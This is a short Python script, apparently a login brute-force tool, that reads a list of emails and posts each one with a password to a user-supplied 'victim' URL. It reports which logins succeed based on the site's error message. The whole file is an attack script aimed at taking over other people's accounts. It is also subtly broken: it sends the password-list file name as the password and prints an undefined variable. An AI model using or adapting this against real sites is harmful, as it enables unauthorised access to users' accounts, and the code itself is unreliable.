import requests
url = input('Please enter your url victim:\t')
email = input('Please enter the user list file (name of the file or the path):\t')
password = input('Please enter the password list (name of the file or path):\t')
with open(email,'r') as userlist:
    for u in userlist:
        u = ''.join(u.split("\n"))
        data_payload = {
        'email': u,
        'password': password,
        'RememberMe': 'false'
        }
        site = requests.post(f'{url}', data=data_payload)
        text = site.text
        if "The email or password provided is incorrect" in text:
             print(f'Login failed: {u} {p}')
        else:
             print(f'The login is success: {u} {p}')
                    
   # GLITCH422

